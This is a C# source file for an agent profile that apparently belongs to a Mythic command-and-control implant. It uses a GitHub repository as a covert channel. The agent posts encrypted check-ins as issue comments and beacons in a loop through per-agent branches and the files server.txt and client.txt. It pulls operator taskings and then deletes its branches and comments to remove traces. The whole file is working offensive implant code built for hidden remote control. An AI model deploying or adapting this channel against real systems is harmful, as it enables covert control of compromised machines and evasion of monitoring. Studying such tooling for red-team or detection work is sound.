using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using Octokit;
using System.Text;
using System.Text.Json;

namespace Agent.Profiles
{
    public class GitHub : IProfile
    {
        private IAgentConfig agentConfig { get; set; }
        private ICryptoManager crypt { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
        private AutoResetEvent clientReady = new AutoResetEvent(false);
        private readonly string _uuid = Guid.NewGuid().ToString();
        private CheckinResponse cir;

        private bool checkedin = false;
        private bool connected = false;
        private int currentAttempt = 0;
        private int maxAttempts = 10;

        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;

        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        private static readonly GitHubClient client = new GitHubClient(new ProductHeaderValue("ApiClient"));
        private readonly string GITHUB_TOKEN;
        private readonly string OWNER;
        private readonly string REPO;
        private readonly int SERVER_ISSUE;
        private readonly int CLIENT_ISSUE;
        
        public GitHub(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
        {
            this.crypt = crypto;
            this.agentConfig = config;
            this.logger = logger;
            this.messageManager = messageManager;
            var opts = JsonSerializer.Deserialize(
                ChannelConfig.Decode(),
                GitHubChannelOptionsJsonContext.Default.GitHubChannelOptions)
                ?? throw new InvalidOperationException("Invalid GitHub profile configuration");
            GITHUB_TOKEN = opts.PersonalAccessToken;
            OWNER = opts.GithubUsername;
            REPO = opts.GithubRepo;
            SERVER_ISSUE = opts.ServerIssueNumber;
            CLIENT_ISSUE = opts.ClientIssueNumber;

            var tokenAuth = new Credentials(GITHUB_TOKEN);
            client.Credentials = tokenAuth;
        }

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            // Post Checkin
            Console.WriteLine($"Checkin UUID: {agentConfig.uuid}");

            // Send Checkin
            string msg = JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin);
            string checkin_msg = this.crypt.Encrypt(msg);
            //Console.WriteLine(checkin_msg);
            try
            {
                var createdComment = await client.Issue.Comment.Create(OWNER, REPO, CLIENT_ISSUE, checkin_msg);

            }
            catch (Exception e)
            {
                Console.WriteLine($"Error: {e.Message}");
            }

            // Retrieve Checkin Response (cir)
            int maxAttempts = 3;
            int currentAttempt = 0;
            do
            {
                // Relax.. wait for Mythic to post a checkin response (cir) to GitHub for the agent to retrieve 
                await Task.Delay(3000, cancellationTokenSource.Token);

                List<string> comments = await GetComments();
                CheckinResponse? response = comments
                    .Select(ParseCheckinResponse)
                    .FirstOrDefault(candidate => candidate is not null);
                if (response is not null)
                {
                    this.checkedin = true;
                    this.cir = response;
                    return this.cir;
                }
                currentAttempt++;
            } while (currentAttempt <= maxAttempts);
            
            return new CheckinResponse()
            {
                status = "failed"
            };
        }

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            Console.WriteLine($"Start beacon UUID: {agentConfig.uuid}");

            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                // Create new branch
                Console.WriteLine("Creating branch");
                var baseRef = await client.Git.Reference.Get(OWNER, REPO, $"heads/main");
                var newBranchRef = new NewReference($"refs/heads/{agentConfig.uuid}", baseRef.Object.Sha);
                var createdRef = await client.Git.Reference.Create(OWNER, REPO, newBranchRef);
                string firstCommitHash = createdRef.Object.Sha;

                Console.WriteLine("Checking In");
                // Push get_tasking message to repo for server to retrieve
                string agentSha = "";
                try
                {
                    agentSha = await messageManager.DeliverAsync(
                        async payload =>
                        {
                            string message = this.crypt.Encrypt(payload);
                            var createRequest = new CreateFileRequest(agentConfig.uuid, message, agentConfig.uuid);
                            var result = await client.Repository.Content.CreateFile(OWNER, REPO, "server.txt", createRequest);
                            return result.Commit.Sha;
                        },
                        sha => !string.IsNullOrEmpty(sha));
                    this.currentAttempt = string.IsNullOrEmpty(agentSha) ? this.currentAttempt + 1 : 0;
                }
                catch (Exception e)
                {
                    this.currentAttempt++;
                    Console.WriteLine($"{e.Message}");
                }

                // Wait for Mythic to push response back to GitHub repo
                Console.WriteLine("Waiting for Mythic to push back");
                int maxAttempts = 3;
                int currentAttempt = 0;
                bool isSuccessful = false;
                do
                {
                    await Task.Delay(3000, cancellationTokenSource.Token);
                    try
                    {
                        var branch = await client.Repository.Branch.Get(OWNER, REPO, agentConfig.uuid);
                        if (branch.Commit.Sha != agentSha)
                        {
                            isSuccessful = true;
                        }
                    }
                    catch (NotFoundException)
                    {
                        Console.WriteLine($"Mythic has not pushed client.txt yet");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"An error occurred: {ex.Message}");
                    }
                    currentAttempt++;
                }
                while (!isSuccessful && currentAttempt < maxAttempts);

                // Retrieve get_tasking response from repo
                Console.WriteLine("Getting response back from Mythic");
                try
                {
                    var fileContents = await client.Repository.Content.GetAllContentsByRef(OWNER, REPO, "client.txt", agentConfig.uuid);
                    string mythResp = this.crypt.Decrypt(fileContents[0].Content);
                    GetTaskingResponse? gtr = ParseTaskingResponse(mythResp);
                    if (gtr is not null)
                    {
                        TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
                        this.SetTaskingReceived?.Invoke(this, tra);
                    }
                }
                catch (NotFoundException)
                {
                    Console.WriteLine($"File 'client.txt' not found in repository '{REPO}' on branch '{agentConfig.uuid}'.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error: {ex.Message}");
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                }

                // Delete branch
                Console.WriteLine("Deleting branch");
                try
                {
                    // Delete the branch
                    await client.Git.Reference.Delete(OWNER, REPO, $"refs/heads/{agentConfig.uuid}");
                    Console.WriteLine($"Branch '{agentConfig.uuid}' deleted successfully.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"An error occurred while deleting the branch: {ex.Message}");
                }
                // Rest
                await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000, cancellationTokenSource.Token);
            }
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }

        private CheckinResponse? ParseCheckinResponse(string content)
        {
            try
            {
                CheckinResponse? response = JsonSerializer.Deserialize(content, CheckinResponseJsonContext.Default.CheckinResponse);
                return CheckinResponseValidation.IsSuccessful(response) ? response : null;
            }
            catch (JsonException)
            {
                return null;
            }
        }

        private GetTaskingResponse? ParseTaskingResponse(string content)
        {
            GetTaskingResponse? response = JsonSerializer.Deserialize(content, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
            return response?.action == "get_tasking" ? response : null;
        }

        private bool TryDecodeOwnedComment(string body, out string plaintext)
        {
            plaintext = string.Empty;
            try
            {
                string decoded = Encoding.UTF8.GetString(Convert.FromBase64String(body));
                if (decoded.Length < 36 || decoded[..36] != agentConfig.uuid)
                {
                    return false;
                }

                plaintext = crypt.Decrypt(body);
                return true;
            }
            catch
            {
                return false;
            }
        }

        private List<string> DecodeOwnedComments(IEnumerable<string> bodies)
        {
            var decoded = new List<string>();
            foreach (string body in bodies)
            {
                if (TryDecodeOwnedComment(body, out string plaintext))
                {
                    decoded.Add(plaintext);
                }
            }
            return decoded;
        }

        internal async Task<List<string>> GetComments()
        {
            // Get all comments
            var comments = new List<string>();

            try
            {
                var all_comments = await client.Issue.Comment.GetAllForIssue(OWNER, REPO, SERVER_ISSUE);
                foreach (var comment in all_comments)
                {
                    if (TryDecodeOwnedComment(comment.Body, out string plaintext))
                    {
                        comments.Add(plaintext);
                        //delete comment
                        try
                        {
                            await client.Issue.Comment.Delete(OWNER, REPO, comment.Id);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine($"Error: {e.Message}");
                        }
                    }
                }
            }
            catch (Exception e )
            {
                Console.WriteLine($"Error: {e.Message}");
            }
            return comments;
        }
    }
}